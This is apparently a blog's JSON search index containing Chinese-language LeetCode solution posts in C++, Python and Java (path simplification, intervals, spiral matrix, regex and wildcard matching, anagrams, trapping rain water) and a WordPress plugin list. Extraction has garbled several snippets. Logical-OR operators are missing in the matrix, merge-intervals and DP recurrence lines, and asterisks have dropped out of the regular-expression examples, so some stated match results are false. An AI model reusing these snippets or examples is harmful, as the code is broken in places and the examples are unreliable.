if(!matrix[i][0]) col0_zero = true; for(int j = 1; j &lt; matrix[0].size(); ++j) if(!matrix[i][j]) matrix[i][0] = matrix[0][j] = 0; &#125; for(int i = matrix.size() - 1; i &gt;= 0; --i)&#123; for(int j = matrix[0].size() - 1 ; j &gt;= 1; --j) if(!matrix[i][0] !matrix[0][j]) matrix[i][j] = 0; if(col0_zero) matrix[i][0] = 0; &#125; &#125;&#125;;","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"leetcode Simplify Path","slug":"leetcode-simplify-path","date":"2015-02-20T07:29:55.000Z","updated":"2020-10-26T15:19:35.279Z","comments":true,"path":"leetcode-simplify-path/","link":"","permalink":"https://www.hrwhisper.me/leetcode-simplify-path/","excerpt":"leetcode Simplify Path Given an absolute path for a file (Unix-style), simplify it. For example, path = \"/home/\", =&gt; \"/home\" path = \"/a/./b/../../c/\", =&gt; \"/c\" Corner Cases: Did you consider the case where path = \"/../\"? In this case, you should return \"/\". Another corner case is the path might contain multiple slashes '/' together, such as \"/home//foo/\". In this case, you should ignore redundant slashes and return \"/home/foo\".","text":"leetcode Simplify Path Given an absolute path for a file (Unix-style), simplify it. For example, path = \"/home/\", =&gt; \"/home\" path = \"/a/./b/../../c/\", =&gt; \"/c\" Corner Cases: Did you consider the case where path = \"/../\"? In this case, you should return \"/\". Another corner case is the path might contain multiple slashes '/' together, such as \"/home//foo/\". In this case, you should ignore redundant slashes and return \"/home/foo\". 题目地址：leetcode Simplify Path 题意：给定unix路径，要求进行简化。 思路：unix路径主要是用'/'进行区分 一个点表示当前目录，两个点表示上级目录。 可以按照 '/'进行划分，如果遇到'..'就数组中移出最后一个（就是个栈嘛），遇到‘.'就无视吧~ C++没有split函数，于是就来硬的。。(也可以用getline(ss, cur, '/')) 来划分 和Python相比。。py好简洁。 C++ getline version 123456789101112131415161718class Solution &#123;public: string simplifyPath(string path) &#123; stringstream ss(path); vector&lt;string&gt; q; string cur; while (getline(ss, cur, &#x27;/&#x27;)) &#123; if (cur == &quot;&quot;) continue; if (cur == &quot;..&quot;) &#123; if (!q.empty()) q.pop_back(); &#125; else if (cur != &quot;.&quot;) q.push_back(cur); &#125; string ans = &quot;&quot;; for (string s : q) ans += &quot;/&quot; + s; return ans != &quot;&quot; ? ans : &quot;/&quot;; &#125;&#125;; C++ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Solution &#123;public: string simplifyPath(string path) &#123; int n = path.length(); stack&lt;string&gt; q; for (int i = 1; i &lt; n; )&#123; if (path[i] == &#x27;.&#x27;)&#123; if (i + 1 &lt; n &amp;&amp; path[i + 1] == &#x27;.&#x27; &amp;&amp; (i+2&gt;=n ||i+2&lt;n&amp;&amp; path[i+2]==&#x27;/&#x27;))&#123; if (!q.empty()) q.pop(); i += 3; continue; &#125; else if (i + 1 &lt; n &amp;&amp; path[i + 1] == &#x27;/&#x27;)&#123; i += 2; continue; &#125; &#125; int cur = path.find_first_of(&#x27;/&#x27;, i); if (cur == -1)&#123; string temp = path.substr(i, n - i); if (temp != &quot; &quot; &amp;&amp; temp != &quot;.&quot; &amp;&amp; temp != &quot;..&quot;) q.push(temp); break; &#125; if (cur!=i) q.push(path.substr(i, cur - i)); while (cur + 1 &lt; n &amp;&amp; path[cur + 1] == &#x27;/&#x27;) cur++; i = cur + 1; &#125; stack&lt;string&gt; q2; while (!q.empty())&#123; q2.push(q.top()); q.pop(); &#125; string ans=&quot;/&quot;; while (!q2.empty())&#123; ans = ans + q2.top(); q2.pop(); if (!q2.empty()) ans = ans + &#x27;/&#x27;; &#125; return ans; &#125;&#125;; Python 1234567891011121314class Solution: # @param path, a string # @return a string def simplifyPath(self, path): q=path.split(&#x27;/&#x27;) ans=[] for s in q: if s: if s==&#x27;..&#x27;: if len(ans) &gt; 0: ans.pop() elif s!=&#x27;.&#x27;: ans.append(s) return &#x27;/&#x27;+&#x27;/&#x27;.join(ans)","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"wordpress 一些推荐的插件","slug":"wordpress-plugin-recommendation","date":"2015-02-15T04:06:03.000Z","updated":"2021-01-08T13:42:14.039Z","comments":true,"path":"wordpress-plugin-recommendation/","link":"","permalink":"https://www.hrwhisper.me/wordpress-plugin-recommendation/","excerpt":"本文推荐一些wordprss插件","text":"本文推荐一些wordprss插件 插件推荐 Akismet：防止垃圾评论必备 YOAST SEO: SEO必备 WP-PostViews：用于查看文章点击量 Hermit: 简洁的音乐插件，支持网易、虾米链接 MathJax-LaTeX： wordpress latex支持 Compress JPEG &amp; PNG images: tinypng 出品的插件，用于将上传的图像压缩，却不影响质量 Crayon Syntax Highlighter: 一个代码框插件，样式漂亮。样例如下： C++ 12345#include&lt;cstdio&gt;int main()&#123; cout &lt;&lt; &quot;hello world&quot; &lt;&lt; endl; return 0;&#125; python： 1print &#39;hello world&#39; PS: PHP-7.3 需要修复一下，不然会有错误，见：https://github.com/aramk/crayon-syntax-highlighter/pull/451/files 简单的说，就是把crayon_langs.class.php中下面的第一行改为第二行的内容： 12preg_replace(&#x27;/[^\\w-+#]/msi&#x27;, &#x27;&#x27;, $id);preg_replace(&#x27;/[^\\w\\-+#]/msi&#x27;, &#x27;&#x27;, $id); 其它也还不错的插件 WP-Mail-SMTP: 发送邮件插件，直接用这个设置省得修改wordpress中class-phpmailer中内容 WP Clean Up ： 用于删除每次修改文章增加的历史版本，减少数据库体积 WPJAM 七牛镜像存储：七牛cdn的插件，加速blog访问，也防止租用主机空间不足。（比如，我的图大部分都是存在lofter上的，这个插件可以把lofter上的外链变成七牛的链接，就不会被屏蔽了） WPtouch pro :手机访问的插件 多说：评论的插件，支持微博/QQ等登陆。 Rel Nofollow Checkbox：快速为文章的链接添加no follow","categories":[{"name":"others","slug":"others","permalink":"https://www.hrwhisper.me/categories/others/"},{"name":"建站经验","slug":"others/建站经验","permalink":"https://www.hrwhisper.me/categories/others/%E5%BB%BA%E7%AB%99%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"wordpress","slug":"wordpress","permalink":"https://www.hrwhisper.me/tags/wordpress/"}]},{"title":"leetcode 区间","slug":"leetcode-intervals","date":"2015-02-14T23:47:59.000Z","updated":"2021-01-08T13:32:16.851Z","comments":true,"path":"leetcode-intervals/","link":"","permalink":"https://www.hrwhisper.me/leetcode-intervals/","excerpt":"本次题解包括 56. Merge Intervals 57. Insert Interval","text":"本次题解包括 56. Merge Intervals 57. Insert Interval 56. Merge Intervals Given a collection of intervals, merge all overlapping intervals. For example, Given [1,3],[2,6],[8,10],[15,18], return [1,6],[8,10],[15,18]. 题目地址：leetcode Merge Intervals 题目大意: 给定一些区间，进行合并 思路：按照区间的左端点进行排序，从左到右扫描，判断能否合并即可。水~ C++ 1234567891011121314151617class Solution &#123;public: vector&lt;Interval&gt; merge(vector&lt;Interval&gt;&amp; intervals) &#123; sort(intervals.begin(), intervals.end(), [](const Interval&amp; a, const Interval&amp; b) &#123; return a.start &lt; b.start; &#125;); vector&lt;Interval&gt; ans; for(Interval &amp;cur : intervals)&#123; if(ans.empty() ans.back().end &lt; cur.start) ans.push_back(cur); else&#123; ans.back().end = max(ans.back().end, cur.end); &#125; &#125; return ans; &#125; Python 1234567891011121314class Solution(object): def merge(self, intervals): &quot;&quot;&quot; :type intervals: List[Interval] :rtype: List[Interval] &quot;&quot;&quot; intervals.sort(key=lambda a: a.start) ans = [] for t in intervals: if not ans or ans[-1].end &lt; t.start: ans.append(t) else: ans[-1].end = max(ans[-1].end, t.end) return ans 57. Insert Interval Given a set of non-overlapping intervals, insert a new interval into the intervals (merge if necessary). You may assume that the intervals were initially sorted according to their start times. Example 1: Given intervals [1,3],[6,9], insert and merge [2,5] in as [1,5],[6,9]. Example 2: Given [1,2],[3,5],[6,7],[8,10],[12,16], insert and merge [4,9] in as [1,2],[3,10],[12,16]. This is because the new interval [4,9] overlaps with [3,5],[6,7],[8,10]. 题目地址：leetcode Insert Interval 题目大意: 给定已经合并好的区间（并且按照左端点从小到大），插入一个区间进去，必要时进行合并 思路： 和上面一题差不多，只不过不用排序。可以用二分搜索找到要插入的区间位置，插入然后合并即可。 当然不一定要二分，顺序搜索也行，复杂度都是O(n)。 C++ 123456789101112131415161718192021222324252627class Solution &#123;public: vector&lt;Interval&gt; insert(vector&lt;Interval&gt;&amp; intervals, Interval newInterval) &#123; auto iter = upper_bound(intervals.begin(), intervals.end(), newInterval, [](const Interval&amp; a, const Interval&amp; b) &#123; return a.start &lt;= b.start; &#125;); // (--iter)-&gt;start &lt; newInterval.start vector&lt;Interval&gt; ans(intervals.begin(), iter); // insert newInterval if (!ans.empty() &amp;&amp; newInterval.start &lt;= ans.back().end) ans.back().end = max(ans.back().end, newInterval.end); else ans.push_back(newInterval); // solve other elements.(maybe overlap) for (; iter != intervals.end(); ++iter) &#123; if (iter-&gt;start &lt;= ans.back().end) ans.back().end = max(ans.back().end, iter-&gt;end); else ans.push_back(*iter); &#125; return ans; &#125;&#125;; Python 1234567891011121314151617181920212223242526272829303132class Solution(object): def insert(self, intervals, newInterval): &quot;&quot;&quot; :type intervals: List[Interval] :type newInterval: Interval :rtype: List[Interval] &quot;&quot;&quot; def _binary_search(a, x): l, r = 0, len(a) while l &lt; r: mid = (l + r) &gt;&gt; 1 if a[mid].start &lt;= x.start: l = mid + 1 else: r = mid return l index = _binary_search(intervals, newInterval) # intervals[i - 1].start &lt; newInterval.start ans = intervals[:index] if ans and newInterval.start &lt;= ans[-1].end: ans[-1].end = max(newInterval.end, ans[-1].end) else: ans.append(newInterval) for i in range(index, len(intervals)): if intervals[i].start &lt;= ans[-1].end: ans[-1].end = max(intervals[i].end, ans[-1].end) else: ans.append(intervals[i]) return ans 本文是leetcode如下的题解 56. Merge Intervals 57. Insert Interval 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"leetcode Spiral Matrix || leetcode Spiral Matrix II","slug":"leetcode-spiral-matrix-or-spiral-matrix-ii","date":"2015-02-14T23:16:04.000Z","updated":"2021-01-08T13:32:16.868Z","comments":true,"path":"leetcode-spiral-matrix-or-spiral-matrix-ii/","link":"","permalink":"https://www.hrwhisper.me/leetcode-spiral-matrix-or-spiral-matrix-ii/","excerpt":"leetcode Spiral Matrix Given a matrix of m x n elements (m rows, n columns), return all elements of the matrix in spiral order. For example, Given the following matrix: [ [ 1, 2, 3 ], [ 4, 5, 6 ], [ 7, 8, 9 ]] You should return [1,2,3,6,9,8,7,4,5].","text":"leetcode Spiral Matrix Given a matrix of m x n elements (m rows, n columns), return all elements of the matrix in spiral order. For example, Given the following matrix: [ [ 1, 2, 3 ], [ 4, 5, 6 ], [ 7, 8, 9 ]] You should return [1,2,3,6,9,8,7,4,5]. 题目地址：leetcode Spiral Matrix 题意：给定一个矩阵，按题目要求求出序列。。。 思路：直接循环模拟即可 C++ 1234567891011121314151617181920212223242526272829class Solution &#123;public: vector&lt;int&gt; spiralOrder(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) &#123; vector&lt;int&gt; ans; if(matrix.empty()) return ans; int left = 0, right = matrix[0].size() - 1, top = 0, bottom = matrix.size() - 1; while(left &lt;= right &amp;&amp; top &lt;= bottom)&#123; for(int i = left; i &lt;= right; ++i) ans.push_back(matrix[top][i]); if(++top &gt; bottom) break; for(int i = top; i &lt;= bottom; ++i) ans.push_back(matrix[i][right]); if(--right &lt; left) break; for(int i = right; i &gt;= left; --i) ans.push_back(matrix[bottom][i]); if(--bottom &lt; top) break; for(int i = bottom; i &gt;= top; --i) ans.push_back(matrix[i][left]); ++left; &#125; return ans; &#125;&#125;; Python 12345678910111213141516171819202122232425262728293031class Solution(object): def spiralOrder(self, matrix): &quot;&quot;&quot; :type matrix: List[List[int]] :rtype: List[int] &quot;&quot;&quot; ans = [] if not matrix: return ans top, bottom, left, right = 0, len(matrix) - 1, 0, len(matrix[0]) - 1 while left &lt;= right and top &lt;= bottom: for i in range(left, right + 1): ans.append(matrix[top][i]) top += 1 if top &gt; bottom: break for i in range(top, bottom + 1): ans.append(matrix[i][right]) right -= 1 if right &lt; left: break for i in range(right, left - 1, -1): ans.append(matrix[bottom][i]) bottom -= 1 if bottom &lt; top: break for i in range(bottom, top - 1, -1): ans.append(matrix[i][left]) left += 1 return ans leetcode Spiral Matrix II Given an integer n, generate a square matrix filled with elements from 1 to _n_2 in spiral order. For example, Given n = 3, You should return the following matrix: [ [ 1, 2, 3 ], [ 8, 9, 4 ], [ 7, 6, 5 ]] 题目地址：leetcode Spiral Matrix II 题意:这题和上面一题的区别在于，这题是给n，求从1~n组从的序列 思路直接用上面的代码改改即可。 C++ 12345678910111213141516171819202122232425262728class Solution &#123;public: vector&lt;vector&lt;int&gt;&gt; generateMatrix(int n) &#123; vector&lt;vector&lt;int&gt;&gt; ans(n, vector&lt;int&gt;(n)); int left = 0, right = n - 1, top = 0, bottom = n - 1; int cur = 0; while(left &lt;= right &amp;&amp; top &lt;= bottom)&#123; for(int i = left; i &lt;= right; ++i) ans[top][i] = ++cur; if(++top &gt; bottom) break; for(int i = top; i &lt;= bottom; ++i) ans[i][right] = ++cur; if(--right &lt; left) break; for(int i = right; i &gt;= left; --i) ans[bottom][i] = ++cur; if(--bottom &lt; top) break; for(int i = bottom; i &gt;= top; --i) ans[i][left] = ++cur; ++left; &#125; return ans; &#125;&#125;; Python 1234567891011121314151617181920212223242526272829303132333435class Solution(object): def generateMatrix(self, n): &quot;&quot;&quot; :type n: int :rtype: List[List[int]] &quot;&quot;&quot; ans = [[0] * n for _ in range(n)] top, bottom, left, right = 0, n - 1, 0, n - 1 cur = 1 while left &lt;= right and top &lt;= bottom: for i in range(left, right + 1): ans[top][i] = cur cur += 1 top += 1 if top &gt; bottom: break for i in range(top, bottom + 1): ans[i][right] = cur cur += 1 right -= 1 if right &lt; left: break for i in range(right, left - 1, -1): ans[bottom][i] = cur cur += 1 bottom -= 1 if bottom &lt; top: break for i in range(bottom, top - 1, -1): ans[i][left] = cur cur += 1 left += 1 return ans","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"leetcode Regular Expression Matching || leetcode Wildcard Matching","slug":"leetcode-regular-expression-matching-leetcode-wildcard-matching","date":"2015-02-12T15:39:17.000Z","updated":"2021-01-08T13:32:16.863Z","comments":true,"path":"leetcode-regular-expression-matching-leetcode-wildcard-matching/","link":"","permalink":"https://www.hrwhisper.me/leetcode-regular-expression-matching-leetcode-wildcard-matching/","excerpt":"10. Regular Expression Matching Implement regular expression matching with support for '.' and '*'. '.' Matches any single character. '*' Matches zero or more of the preceding element. The matching should cover the entire input string (not partial). The function prototype should be: bool isMatch(const char s, const char p) Some examples: isMatch(\"aa\",\"a\") → false isMatch(\"aa\",\"aa\") → true isMatch(\"aaa\",\"aa\") → false isMatch(\"aa\", \"a\") → true isMatch(\"aa\", \".\") → true isMatch(\"ab\", \".\") → true isMatch(\"aab\", \"ca*b\") → true","text":"10. Regular Expression Matching Implement regular expression matching with support for '.' and '*'. '.' Matches any single character. '*' Matches zero or more of the preceding element. The matching should cover the entire input string (not partial). The function prototype should be: bool isMatch(const char s, const char p) Some examples: isMatch(\"aa\",\"a\") → false isMatch(\"aa\",\"aa\") → true isMatch(\"aaa\",\"aa\") → false isMatch(\"aa\", \"a\") → true isMatch(\"aa\", \".\") → true isMatch(\"ab\", \".\") → true isMatch(\"aab\", \"ca*b\") → true 题目地址：leetcode Regular Expression Matching 题意：'.'表示可以代替任何字符，*表示可以代替前面一个出现的字符，且可以代表任意个，给定字符串s和p，问s和p是否匹配。 aab和c*a*b为true时因为，p中第一个*代替0个c，第二个*代替两个a，于是可以变为aab，和s相同，所以为true If the next character of p is NOT *, then it must match the current character of s. Continue pattern matching with the next character of both s and p. If the next character of p is *, then we do a brute force exhaustive matching of 0, 1, or more repeats of current character of p... Until we could not match any more characters C++ 12345678910111213141516171819202122class Solution &#123;private: bool do_match(size_t i, size_t j, const string &amp;s, const string &amp;p) &#123; if (p.size() &lt;= j) return s.size() &lt;= i; if (j + 1 &lt; p.size() &amp;&amp; p[j + 1] == &#x27;*&#x27;) &#123; for (; i &lt; s.size() &amp;&amp; (s[i] == p[j] || p[j] == &#x27;.&#x27;); i++) &#123; if (do_match(i, j + 2, s, p)) return true; &#125; return do_match(i, j + 2, s, p); &#125; else &#123; if (p[j] == &#x27;.&#x27; &amp;&amp; i &lt; s.size() || p[j] == s[i]) return do_match(i + 1, j + 1, s, p); return false; &#125; &#125;public: bool isMatch(string s, string p) &#123; return do_match(0, 0, s, p); &#125;&#125;; Python版本正着写一直很慢。。 12345678910111213141516class Solution: # @return a boolean def isMatch(self,s,p): if not p: return not s if p[-1]==&#x27;*&#x27;: if len(p)==1: return False if self.isMatch(s, p[:-2]): return True if s and (s[-1]==p[-2] or p[-2]==&#x27;.&#x27;): return self.isMatch(s[:-1], p) else: if s and (s[-1]==p[-1] or p[-1]==&#x27;.&#x27;): return self.isMatch(s[:-1], p[:-1] ) return False 44. Wildcard Matching Implement wildcard pattern matching with support for '?' and '*'. '?' Matches any single character. '*' Matches any sequence of characters (including the empty sequence). The matching should cover the entire input string (not partial). The function prototype should be: bool isMatch(const char s, const char p) Some examples: isMatch(\"aa\",\"a\") → false isMatch(\"aa\",\"aa\") → true isMatch(\"aaa\",\"aa\") → false isMatch(\"aa\", \"\") → true isMatch(\"aa\", \"a\") → true isMatch(\"ab\", \"?\") → true isMatch(\"aab\", \"ca*b\") → false 题目地址：leetcode Wildcard Matching 题目大意：和上面一题类似，?表示匹配任何字符，*表示匹配任意字符串序列，给定s和p，问是否匹配。 和上面一题的最大区别在于，*不在表示前面一个字符，而是可以变成任意字符串序列。 学着上面一题的思路，写了个递归，TLE ! 想到连续的几个*和一个是一样的！于是改了，依然TLE! 然后用dp了。 dp[i][j]为前i个s和前j p是否匹配。 则有： p[j]=='*' dpi][j]=dp[i-1][j] dp[i][j-1] (*要么匹配当前的，要么不匹配） p[j] ≠'*' dp[i][j]=dp[i-1][j-1] (当然，p[j-1]==s[j-1] p[j-1]=='?') 记得用两个一维数组即可，o(n*m）空间会超内存T^T。 嗯，还有就是要做一个剪枝，p长度为m，s长度为n，设p中'*'个数为cnt，如果n-cnt &gt; m，显然无解。 C++ 12345678910111213141516171819202122232425262728class Solution &#123;public: bool isMatch(const char *s, const char *p) &#123; int m = strlen(s); int n = strlen(p); int cnt = count(p, p + n, &#x27;*&#x27;); if (n - cnt &gt; m) return false; vector&lt;bool&gt; dp(n + 1, false); dp[0] = 1; for (int j = 1; j &lt;= n; j++) if (p[j - 1] == &#x27;*&#x27;) dp[j] = dp[j - 1]; for (int i = 1; i &lt;= m; i++) &#123; vector&lt;bool&gt; cur (n + 1, false); for (int j = 1; j &lt;= n; j++) &#123; if (p[j - 1] == &#x27;*&#x27;)&#123; cur[j] = dp[j] || cur[j - 1]; &#125; else&#123; if (s[i - 1] == p[j - 1] || p[j - 1] == &#x27;?&#x27;) cur[j] = dp[j - 1]; &#125; &#125; dp = cur; &#125; return dp[n]; &#125;&#125;; Python 123456789101112131415161718192021222324class Solution: # @param s, an input string # @param p, a pattern string # @return a boolean def isMatch(self, s, p): m,n = len(s),len(p) cnt =p.count(&#x27;*&#x27;) if n - cnt &gt; m: return False dp=[True] + [False]*n for j in range(1,n+1): dp[j]= dp[j-1] and p[j-1]==&#x27;*&#x27; for i in range(1,m+1): cur=[False]*(n+1) for j in range(1,n+1): if p[j-1]==&#x27;*&#x27;: cur[j]= cur[j-1] or dp[j] elif p[j-1]==s[i-1] or p[j-1]==&#x27;?&#x27;: cur[j]=dp[j-1] dp=cur return dp[n] C++ 递归TLE版： 1234567891011121314151617181920212223242526272829class Solution &#123;public: bool judge(const char *s, const char *p)&#123; if (*p == &#x27;\\0&#x27;) return *s == &#x27;\\0&#x27;; if (*p == &#x27;*&#x27;)&#123; while (*p == &#x27;*&#x27;) ++p; while (*s != &#x27;\\0&#x27;)&#123; if (judge(s, p)) return true; s++; &#125; return judge(s, p); &#125; else&#123; if (*s == *p || *p == &#x27;?&#x27;) return judge(s + 1, p + 1); else return false; &#125; return false; &#125; bool isMatch(const char *s, const char *p) &#123; int m = strlen(s), n = strlen(p); int cnt = count(p, p + n, &#x27;*&#x27;); if (n - cnt &gt; m) return false; return judge(s, p); &#125;&#125;;","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"leetcode Group Anagrams","slug":"leetcode-anagrams","date":"2015-02-11T14:33:04.000Z","updated":"2021-01-08T13:32:16.890Z","comments":true,"path":"leetcode-anagrams/","link":"","permalink":"https://www.hrwhisper.me/leetcode-anagrams/","excerpt":"Given an array of strings, group anagrams together. For example, given: [\"eat\", \"tea\", \"tan\", \"ate\", \"nat\", \"bat\"], Return: [ [\"ate\", \"eat\",\"tea\"], [\"nat\",\"tan\"], [\"bat\"]] Note: All inputs will be in lower-case.","text":"Given an array of strings, group anagrams together. For example, given: [\"eat\", \"tea\", \"tan\", \"ate\", \"nat\", \"bat\"], Return: [ [\"ate\", \"eat\",\"tea\"], [\"nat\",\"tan\"], [\"bat\"]] Note: All inputs will be in lower-case. 题目地址：leetcode Group Anagrams 题目大意: 给定一些字符串，有的字符串是由字符串颠倒的，比如eat-&gt;tea 要求找出所有的这些单词 思路：直接用将每个字符串放入排好序后的桶中(hash)即可。 C++ 123456789101112131415161718class Solution &#123;public: vector&lt;vector&lt;string&gt;&gt; groupAnagrams(vector&lt;string&gt;&amp; strs) &#123; unordered_map&lt;string, vector&lt;string&gt;&gt; map; for(string &amp;s : strs)&#123; string t(s); sort(t.begin(), t.end()); map[t].push_back(s); &#125; vector&lt;vector&lt;string&gt;&gt; ans; auto it = map.begin(); for(;it != map.end();++it)&#123; ans.push_back(it-&gt;second); &#125; return ans; &#125;&#125;; Python 12345678910class Solution(object): def groupAnagrams(self, strs): &quot;&quot;&quot; :type strs: List[str] :rtype: List[List[str]] &quot;&quot;&quot; m = collections.defaultdict(list) for s in strs: m[&#x27;&#x27;.join(sorted(s))].append(s) return list(m.values()) 本文是leetcode如下的题解 49. Group Anagrams 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Trapping Rain Water","slug":"leetcode-trapping-rain-water","date":"2015-02-09T15:25:36.000Z","updated":"2021-01-08T13:32:16.884Z","comments":true,"path":"leetcode-trapping-rain-water/","link":"","permalink":"https://www.hrwhisper.me/leetcode-trapping-rain-water/","excerpt":"leetcode Trapping Rain Water Given n non-negative integers representing an elevation map where the width of each bar is 1, compute how much water it is able to trap after raining. For example, Given [0,1,0,2,1,0,1,3,2,1,2,1], return 6. The above elevation map is represented by array [0,1,0,2,1,0,1,3,2,1,2,1]. In this case, 6 units of rain water (blue section) are being trapped. Thanks Marcos for contributing this image!","text":"leetcode Trapping Rain Water Given n non-negative integers representing an elevation map where the width of each bar is 1, compute how much water it is able to trap after raining. For example, Given [0,1,0,2,1,0,1,3,2,1,2,1], return 6. The above elevation map is represented by array [0,1,0,2,1,0,1,3,2,1,2,1]. In this case, 6 units of rain water (blue section) are being trapped. Thanks Marcos for contributing this image! 题目地址：leetcode Trapping Rain Water 题意：给定数组A，A[i]表示第i个位置的高度，求可以盛放雨水的容量。（参考图） 思路： 对于A[i],如果A[i]这个位置可以装水，那么左右两边必定各有一个数大于A[i], （设为left[i]和right[i]）且这个位置能放的量最多为min(left[i],right[i]) - A[i] 因此一个直接的想法就是维护两个数组，分别为左右两边的最大值： C++ 12345678910111213141516class Solution &#123;public: int trap(vector&lt;int&gt;&amp; height) &#123; int n = height.size(); vector&lt;int&gt; left(n, 0), right(n, 0); for(int i = 1; i &lt; n; ++i) left[i] = max(left[i - 1], height[i - 1]); for(int i = n - 2; i &gt;= 0; --i) right[i] = max(right[i + 1], height[i + 1]); int ans = 0; for(int i = 1; i &lt; n; ++i) ans += max(0, min(left[i], right[i]) - height[i]); return ans; &#125;&#125;; 另一种写法： 上面的写法left[i]是不包括当前i这个元素的，如果要包括，则可以写成下面这样： 但是最后的更新要改成min(left[i - 1],right[i + 1]) - A[i] Java 1234567891011121314151617181920212223class Solution &#123; public int trap(int[] height) &#123; final int n = height.length; if (n &lt; 2) return 0; int[] maxLeft = new int[n]; int[] maxRight = new int[n]; maxLeft[0] = height[0]; maxRight[n - 1] = height[n - 1]; for (int i = 1; i &lt; n; i++) maxLeft[i] = Math.max(maxLeft[i - 1], height[i]); for (int i = n - 2; i &gt;= 0; i--) maxRight[i] = Math.max(maxRight[i + 1], height[i]); int ans = 0; for (int i = 1; i &lt; n - 1; i++) ans += Math.max(0, Math.min(maxLeft[i - 1], maxRight[i + 1]) - height[i]); return ans; &#125;&#125; 但能用双指针做得更好： 两个指针L=0 和 R =n-1， 维护左边最大max_left和右边最大值max_right，如果 A[L] &lt; A[R] 那么，那么若max_left &gt; A[L]，那么A[L]这个位置可以装水，因为右边A[R]&gt;A[L]，并且左边有元素也比较大，所以能装的水为max_left - A[L]，然后L++ A[L] &gt; A[R]同理，是和A[R]进行比较 ，更新ans， 然后R-- 那么A[L] = A[R]的情况呢？任意的归为上面两种情况均可。这里假设归为第一种情况。那么max_left&gt;A[L]，但是右边的A[L] = A[R]一定能装水么？答案是肯定的。假如不能装水，说明大于L的范围中，均有A[i] &lt;= A[L]（i = L+1...n），但是max_left &gt; A[L], 就是说不可能进入这个分支中。而如果进入了这个分支，那么说明此时R右边必然有比当时max_left来得大的元素。 C++ 123456789101112131415161718class Solution &#123;public: int trap(vector&lt;int&gt;&amp; height) &#123; int L = 0,R = height.size() - 1; int max_left = 0,max_right = 0,ans = 0; while(L &lt; R)&#123; if(height[L] &lt;= height[R])&#123; max_left = max(max_left, height[L]); ans += max_left - height[L++]; &#125; else&#123; max_right = max(max_right, height[R]); ans += max_right - height[R--]; &#125; &#125; return ans; &#125;&#125;; python 123456789101112131415161718class Solution(object): def trap(self, height): &quot;&quot;&quot; :type height: List[int] :rtype: int &quot;&quot;&quot; max_left = max_right = ans = 0 L, R = 0, len(height) - 1 while L &lt; R: if height[L] &lt;= height[R]: max_left = max(max_left, height[L]) ans += max_left - height[L] L += 1 else: max_right = max(max_right, height[R]) ans += max_right - height[R] R -= 1 return ans 另一种写法： left和right为当前的元素位置，维护left_max和right_max分别代表left左边最大值和right右边的最大值。 若left_max &lt; right_max，则说明left只能装left_max - height[left]了（当然需要left_max &gt; height[left]），并让left +=1 否则，说明right只能装right_max - height[right]了（也需要right_max &gt; height[right]），然后right-=1 12345678910111213141516171819202122232425class Solution &#123;public: int trap(vector&lt;int&gt;&amp; height) &#123; int left = 0, right = height.size() - 1, left_max = 0, right_max = 0; int ans = 0; while(left &lt;= right)&#123; if(left_max &lt; right_max)&#123; if(left_max &gt; height[left]) ans += left_max - height[left]; else left_max = height[left]; ++left; &#125; else&#123; if(right_max &gt; height[right]) ans += right_max - height[right]; else right_max = height[right]; --right; &#125; &#125; return ans; &#125;&#125;; 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Rotate 